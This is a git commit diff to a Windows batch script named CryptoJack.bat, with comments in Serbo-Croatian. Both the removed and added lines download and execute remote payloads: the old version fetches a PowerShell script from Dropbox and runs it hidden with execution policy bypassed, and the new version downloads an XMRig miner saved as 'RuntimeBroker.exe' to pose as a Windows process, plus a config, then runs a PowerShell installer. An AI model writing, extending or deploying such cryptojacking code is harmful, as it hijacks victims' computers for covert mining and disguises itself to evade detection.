e20bbcaf14006781024787e8668aec5fbaf90cf2
Djokaj100 <164801869+Djokaj100@users.noreply.github.com>
2026-06-17 16:15:34 +0200

    Modify CryptoJack.bat to download from GitHub
    Updated the script to download miner and configuration from GitHub and execute the PowerShell script.

--- CryptoJack.bat
+++ CryptoJack.bat
@@ -1,4 +1,7 @@
 @echo off
-set currentDir=%~dp0
-start /wait powershell.exe -NoP -NonI -W Hidden -Command "&{(New-Object System.Net.WebClient).DownloadString('https://www.dropbox.com/s/txb5hiuv7g9xm67/CryptoJack1.ps1?dl=1') > '%~dp0CryptoJack1.ps1'; exit}" 
-Powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%~dp0CryptoJack1.ps1""'}"
+:: Preuzimanje rudara i konfiguracije sa tvog GitHub-a
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('TVOJ_RAW_LINK_KA_XMRIG', '%~dp0RuntimeBroker.exe')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('TVOJ_RAW_LINK_KA_CONFIG', '%~dp0config.json')"
+
+:: Pokretanje PowerShell skripte za instalaciju/izvrsavanje
+powershell -ExecutionPolicy Bypass -File "%~dp0CryptoJack1.ps1"
